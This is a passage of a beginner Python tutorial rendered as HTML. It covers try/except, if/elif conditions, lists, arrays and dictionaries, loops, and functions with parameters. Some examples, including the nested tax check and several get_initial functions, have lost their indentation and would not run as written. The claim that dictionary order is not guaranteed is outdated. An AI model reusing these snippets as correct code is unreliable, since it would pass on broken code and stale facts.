class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Error handling, Debugging</span><br><span class="hljs-comment"># Error types: Syntax error, Runtime error, Logic error</span><br><br><span class="hljs-comment"># Syntax error</span><br>x = <span class="hljs-number">2</span><br>y = <span class="hljs-number">3</span><br><span class="hljs-keyword">if</span> x==y<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello&#x27;</span>)<br><br><span class="hljs-comment"># Runtime error</span><br>x = <span class="hljs-number">2</span><br>y = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(x/y)<br><br><span class="hljs-comment"># Catching runtime errors</span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(x/y)<br><span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-comment"># Optionally, log e somewhere</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Sorry, something went wrong&#x27;</span>)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something really went wrong&#x27;</span>)<br><span class="hljs-keyword">finally</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;This always runs on success or failure&#x27;</span>)<br><br><span class="hljs-comment"># Logic error</span><br>x = <span class="hljs-number">2</span><br>y = <span class="hljs-number">3</span><br><span class="hljs-keyword">if</span> x &lt; y:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(x) + <span class="hljs-string">&#x27; is greater than &#x27;</span> + <span class="hljs-built_in">str</span>(y))<br><br></code></pre></td></tr></table></figure><p><strong>When to use try/except/finally?</strong></p><ul><li><p><strong>When something might go wrong</strong></p><ul><li>User input</li><li>Accessing an external system<ul><li>REST call</li><li>File system</li></ul></li></ul></li><li><p><strong>You can act upon the error</strong></p><ul><li>Logging</li><li>Graceful exit</li></ul></li></ul><p><strong>Some final words on try/except/finally</strong></p><ul><li><p><strong>Not used to find bugs</strong></p><ul><li>Debugging, not error handling</li></ul></li><li><p><strong>You don’t have to catch all errors</strong></p><ul><li>Let it bubble up</li><li>Someone else will deal with it</li><li>The application will crash<ul><li>Sometimes, this is exactly what you want to happen</li></ul></li></ul></li></ul><p><strong>Figuring out what went wrong</strong></p><ul><li><p>Stack trace</p><ul><li>Last calls are on the top</li><li>Your code is likely on the bottom</li><li>Seek out line numbers</li></ul></li><li><p>Finding your mistake</p><ul><li>Reread your code</li><li>Check the documentation</li><li>Search the internet</li><li>Take a break</li><li>Ask someone for help</li></ul></li></ul><h3 id="7、Handling-conditions"><a href="#7、Handling-conditions" class="headerlink" title="7、Handling conditions"></a>7、Handling conditions</h3><h4 id="1）Handling-conditions"><a href="#1）Handling-conditions" class="headerlink" title="1）Handling conditions"></a>1）Handling conditions</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Your code needs the ability to take different actions based on different conditions</span><br><span class="hljs-keyword">if</span> price &gt;= <span class="hljs-number">1.00</span>:<br>    tax = <span class="hljs-number">.07</span><br>    <span class="hljs-built_in">print</span>(tax)<br><br><span class="hljs-comment"># You can add a default action using else</span><br><span class="hljs-keyword">if</span> price &gt;= <span class="hljs-number">1.00</span>:<br>    tax = <span class="hljs-number">.07</span><br>    <span class="hljs-built_in">print</span>(tax)<br><span class="hljs-keyword">else</span>:<br>    tax = <span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(tax)<br><br><span class="hljs-comment"># How you indent your code changes execution</span><br><span class="hljs-keyword">if</span> price &gt;= <span class="hljs-number">1.00</span>:<br>    tax = <span class="hljs-number">.07</span><br><span class="hljs-keyword">else</span>:<br>    tax = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(tax)<br><br><span class="hljs-comment"># Be careful when comparing strings: string case sensitive</span><br><span class="hljs-comment"># Use string functions to make case insensitive comparisons</span><br>country = <span class="hljs-string">&#x27;CANADA&#x27;</span><br><span class="hljs-keyword">if</span> country.lower() == <span class="hljs-string">&#x27;canada&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Oh look a Canadian&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;You are not from Canada&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h4 id="2）Handling-multiple-conditions"><a href="#2）Handling-multiple-conditions" class="headerlink" title="2）Handling multiple conditions"></a>2）Handling multiple conditions</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># You may need to check multiple conditions to determine the correct action</span><br><span class="hljs-keyword">if</span> province == <span class="hljs-string">&#x27;Alberta&#x27;</span>:<br>    tax = <span class="hljs-number">0.05</span><br><span class="hljs-keyword">if</span> province == <span class="hljs-string">&#x27;Ontario&#x27;</span>:<br>    tax = <span class="hljs-number">0.13</span><br><br><span class="hljs-comment"># If only one of the conditions will ever occur you can use a single if statement with elif</span><br><span class="hljs-keyword">if</span> province == <span class="hljs-string">&#x27;Alberta&#x27;</span>:<br>    tax = <span class="hljs-number">0.05</span><br><span class="hljs-keyword">elif</span> province == <span class="hljs-string">&#x27;Ontario&#x27;</span>:<br>    tax = <span class="hljs-number">0.13</span><br><br><span class="hljs-comment"># When you use elif instead of multiple if statements you can add a default action</span><br><span class="hljs-keyword">if</span> province == <span class="hljs-string">&#x27;Alberta&#x27;</span>:<br>    tax = <span class="hljs-number">0.05</span><br><span class="hljs-keyword">elif</span> province == <span class="hljs-string">&#x27;Ontario&#x27;</span>:<br>    tax = <span class="hljs-number">0.13</span><br><span class="hljs-keyword">else</span>:<br>    tax = <span class="hljs-number">0.15</span><br><br><span class="hljs-comment"># If multiple conditions cause the same action they can be combined into a single condition</span><br><span class="hljs-keyword">if</span> province == <span class="hljs-string">&#x27;Alberta&#x27;</span> <span class="hljs-keyword">or</span> province == <span class="hljs-string">&#x27;Nunavut&#x27;</span>:<br>    tax = <span class="hljs-number">0.05</span><br><br><span class="hljs-comment"># If you have a list of possible values to check , you can use the IN operator </span><br><span class="hljs-keyword">if</span> province <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;Alberta&#x27;</span>,<span class="hljs-string">&#x27;Nunavut&#x27;</span>):<br>    tax = <span class="hljs-number">0.05</span><br><br></code></pre></td></tr></table></figure><h4 id="3）Complex-condition-checks"><a href="#3）Complex-condition-checks" class="headerlink" title="3）Complex condition checks"></a>3）Complex condition checks</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># If an action depends on a combination of conditions you can nest if statements</span><br><span class="hljs-keyword">if</span> country == <span class="hljs-string">&#x27;Canada&#x27;</span>:<br><span class="hljs-keyword">if</span> province <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;Alberta&#x27;</span>,<span class="hljs-string">&#x27;Nunavut&#x27;</span>):<br>    tax = <span class="hljs-number">0.05</span><br><span class="hljs-keyword">else</span>:<br>    tax = <span class="hljs-number">0.15</span><br><span class="hljs-keyword">else</span>:<br>    tax = <span class="hljs-number">0.0</span><br><br><span class="hljs-comment"># Sometimes you can combine conditions with AND instead of nesting if statements    </span><br><span class="hljs-comment"># combine conditions with and instead of nesting if statements</span><br><span class="hljs-keyword">if</span> gpa &gt; <span class="hljs-number">.85</span>:<br><span class="hljs-keyword">if</span> lowest_grade &gt; <span class="hljs-number">.70</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Well done&#x27;</span>)<br><br><span class="hljs-keyword">if</span> gpa &gt; <span class="hljs-number">.85</span> <span class="hljs-keyword">and</span> lowest_grade &gt; <span class="hljs-number">.70</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Well done&#x27;</span>)<br><br><span class="hljs-comment"># If you need to remember the results of a condition check later in your code, use Boolean variables as flags</span><br><span class="hljs-comment"># use Boolean variables as flags</span><br><span class="hljs-keyword">if</span> gpa &gt; <span class="hljs-number">.85</span> <span class="hljs-keyword">and</span> lowest_grade &gt; <span class="hljs-number">.70</span>:<br>    honour_roll = <span class="hljs-literal">True</span><br><span class="hljs-keyword">else</span>:<br>    honour_roll = <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> honour_roll:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Well done&#x27;</span>)<br>    <br><span class="hljs-comment"># Combining operators allows you to handle complex business rules in your code but must be tested very carefully to avoid introducing errors</span><br><br></code></pre></td></tr></table></figure><h3 id="8、Collections"><a href="#8、Collections" class="headerlink" title="8、Collections"></a>8、Collections</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Collections: Lists, Arrays, Dictionaries</span><br><br><span class="hljs-comment"># Lists(Lists are collections of items)</span><br>name = [<span class="hljs-string">&#x27;Chris&#x27;</span>, <span class="hljs-string">&#x27;Susan&#x27;</span>]<br><span class="hljs-built_in">print</span>(name)<br><br>scores = []<br>scores.append(<span class="hljs-number">98</span>)<br>scores.append(<span class="hljs-number">99</span>)<br><span class="hljs-built_in">print</span>(scores)<br><span class="hljs-built_in">print</span>(scores[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># Arrays(Arrays are also collections of items)</span><br><span class="hljs-keyword">from</span> array <span class="hljs-keyword">import</span> array<br>scores = array(<span class="hljs-string">&#x27;d&#x27;</span>)<br>scores.append(<span class="hljs-number">98</span>)<br>scores.append(<span class="hljs-number">99</span>)<br><span class="hljs-built_in">print</span>(scores)<br><span class="hljs-built_in">print</span>(scores[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># Commom operations</span><br>names = [<span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;Chris&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(names))         <span class="hljs-comment"># Get the number of items</span><br>names.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;Bill&#x27;</span>)   <span class="hljs-comment"># Insert before index</span><br><span class="hljs-built_in">print</span>(names)<br>names.sort()<br><span class="hljs-built_in">print</span>(names)<br><br><span class="hljs-comment"># Retrieving ranges</span><br>names = [<span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;Chris&#x27;</span>, <span class="hljs-string">&#x27;Bill&#x27;</span>]<br>presenters = names[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(names)<br><span class="hljs-built_in">print</span>(presenters)<br><br><span class="hljs-comment"># Dictionaries</span><br>person = &#123;<span class="hljs-string">&#x27;first&#x27;</span>: <span class="hljs-string">&#x27;Susan&#x27;</span>&#125;<br>person[<span class="hljs-string">&#x27;last&#x27;</span>] = <span class="hljs-string">&#x27;Chris&#x27;</span><br><span class="hljs-built_in">print</span>(person)<br><span class="hljs-built_in">print</span>(person[<span class="hljs-string">&#x27;first&#x27;</span>])<br><br></code></pre></td></tr></table></figure><p><strong>What’s the difference?</strong></p><ul><li><p><strong>Arrays</strong></p><ul><li><p>Simple types such as numbers</p></li><li><p>Must all be the same type</p></li></ul></li><li><p><strong>Lists</strong></p><ul><li><p>Store anything</p></li><li><p>Store any type</p></li></ul></li><li><p><strong>Dictionaries</strong></p><ul><li><p>Key/Value pairs</p></li><li><p>Storage order not guaranteed</p></li></ul></li></ul><h3 id="9、Loops"><a href="#9、Loops" class="headerlink" title="9、Loops"></a>9、Loops</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Loops: for, while</span><br><br><span class="hljs-comment"># Loop through a collection</span><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;Chris&#x27;</span>, <span class="hljs-string">&#x27;Bill&#x27;</span>]:<br>    <span class="hljs-built_in">print</span>(name)<br><br><span class="hljs-comment"># Looping a number of times</span><br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(index)<br><br><span class="hljs-comment"># Looping with a condition</span><br>names = [<span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;Chris&#x27;</span>, <span class="hljs-string">&#x27;Bill&#x27;</span>]<br>index = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> index &lt; <span class="hljs-built_in">len</span>(names):<br>    <span class="hljs-built_in">print</span>(names[index])<br>    index = index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h3 id="10、Functions"><a href="#10、Functions" class="headerlink" title="10、Functions"></a>10、Functions</h3><ul><li><p>Functions make your code more readable and easier to maintain</p><ul><li>reuse and readability(复用性和可读性)</li></ul></li><li><p>Always add comments to explain the purpose of your functions</p><ul><li>name notation(名字命名法)</li></ul></li><li><p>Functions must be declared before the line of code where the function is called</p></li></ul><h4 id="1）Function1"><a href="#1）Function1" class="headerlink" title="1）Function1"></a>1）Function1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Sometimes we copy and paste our code</span><br><span class="hljs-keyword">import</span> datetime<br>    <br>first_name = <span class="hljs-string">&#x27;Susan&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;task completed&#x27;</span>)<br><span class="hljs-built_in">print</span>(datetime.datetime.now())<br><span class="hljs-built_in">print</span>()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(x)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;task completed&#x27;</span>)<br><span class="hljs-built_in">print</span>(datetime.datetime.now())<br><span class="hljs-built_in">print</span>()<br><br><br><span class="hljs-comment"># Use functions instead of repeating code</span><br><span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-comment"># Print the current time</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_time</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;task completed&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(datetime.datetime.now())<br>    <span class="hljs-built_in">print</span>()<br>    <br>first_name = <span class="hljs-string">&#x27;Susan&#x27;</span><br>print_time()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(x)<br>print_time()<br><br><span class="hljs-comment"># By moving the code to a function, you reduce rework and the chance of introducing bugs when you change the code you had copied</span><br><br><span class="hljs-comment"># Import the datetime class from datetime library</span><br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-comment"># Now I don&#x27;t need the extra datetime prefix</span><br><span class="hljs-built_in">print</span>(datetime.now())<br><br></code></pre></td></tr></table></figure><h4 id="2）Function2"><a href="#2）Function2" class="headerlink" title="2）Function2"></a>2）Function2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># What if I want a different message displayed?</span><br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br>    <br>first_name = <span class="hljs-string">&#x27;Susan&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;first name assigned&#x27;</span>)<br><span class="hljs-built_in">print</span>(datetime.now())<br><span class="hljs-built_in">print</span>()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(x)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;loop completed&#x27;</span>)<br><span class="hljs-built_in">print</span>(datetime.now())<br><span class="hljs-built_in">print</span>()<br><br><br><span class="hljs-comment"># Pass the task name as a parameter </span><br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-comment"># Print the current time</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_time</span>(<span class="hljs-params">task_name</span>):</span><br>    <span class="hljs-built_in">print</span>(task_name)<br>    <span class="hljs-built_in">print</span>(datetime.now())<br>    <span class="hljs-built_in">print</span>()<br>    <br>first_name = <span class="hljs-string">&#x27;Susan&#x27;</span><br>print_time(<span class="hljs-string">&#x27;first name assigned&#x27;</span>)<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(x)<br>print_time(<span class="hljs-string">&#x27;loop completed&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h4 id="3）Function3"><a href="#3）Function3" class="headerlink" title="3）Function3"></a>3）Function3</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Here&#x27;s another example where the code looks different but we are doing the same logic over and over</span><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>first_name_initial = first_name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br><br>last_name = <span class="hljs-string">&#x27;ibach&#x27;</span><br>last_name_initial = last_name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials are: &#x27;</span> + first_name_initial + last_name_initial)<br><br><br><span class="hljs-comment"># I can still use a function, but this time my function returns a value</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name</span>):</span><br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> initial<br><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>first_name_initial = get_initial(first_name)<br><br>last_name = <span class="hljs-string">&#x27;ibach&#x27;</span><br>last_name_initial = get_initial(last_name)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials are: &#x27;</span> + first_name_initial + last_name_initial)<br><br><br><span class="hljs-comment"># If you need to change something you only have to change it in one place!</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name</span>):</span><br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>].upper()<br>    <span class="hljs-keyword">return</span> initial<br><br><br><span class="hljs-comment"># Functions that return values allow clever code, but you might trade readability for less code</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name</span>):</span><br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> initial<br><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>last_name = <span class="hljs-string">&#x27;ibach&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials are: &#x27;</span> + get_initial(first_name) + get_initial(last_name))<br><br></code></pre></td></tr></table></figure><h4 id="4）Function-parameters"><a href="#4）Function-parameters" class="headerlink" title="4）Function parameters"></a>4）Function parameters</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Functions can accept multiple parameters</span><br><span class="hljs-comment"># Pass the parameters in the same order they are listed in the function declaration</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name, force_uppercase</span>):</span><br>    <span class="hljs-keyword">if</span> force_uppercase:<br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>].upper()<br>    <span class="hljs-keyword">else</span>:<br>        initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> initial<br><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>first_name_initial = get_initial(first_name, <span class="hljs-literal">True</span>)<br><br>last_name = <span class="hljs-string">&#x27;ibach&#x27;</span><br>last_name_initial = get_initial(last_name, <span class="hljs-literal">False</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials are: &#x27;</span> + first_name_initial + last_name_initial)<br><br><br><span class="hljs-comment"># You can specify a default value for a parameter</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name, force_uppercase=<span class="hljs-literal">True</span></span>):</span><br>    <span class="hljs-keyword">if</span> force_uppercase:<br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>].upper()<br>    <span class="hljs-keyword">else</span>:<br>        initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> initial<br><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>first_name_initial = get_initial(first_name)<br><br>last_name = <span class="hljs-string">&#x27;ibach&#x27;</span><br>last_name_initial = get_initial(last_name, <span class="hljs-literal">False</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials are: &#x27;</span> + first_name_initial + last_name_initial)<br><br><br><span class="hljs-comment"># You can also assign the values to parameters by name when you call the function</span><br><span class="hljs-comment"># When you use named parameters, you can specify parameters in any order</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name, force_uppercase</span>):</span><br>    <span class="hljs-keyword">if</span> force_uppercase:<br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>].upper()<br>    <span class="hljs-keyword">else</span>:<br>        initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> initial<br><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>first_name_initial = get_initial(force_uppercase=<span class="hljs-literal">True</span>, name=first_name)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials is: &#x27;</span> + first_name_initial)<br><br></code></pre></td></tr></table></figure><h3 id="11、Modules-and-packages"><a href="#11、Modules-and-packages" 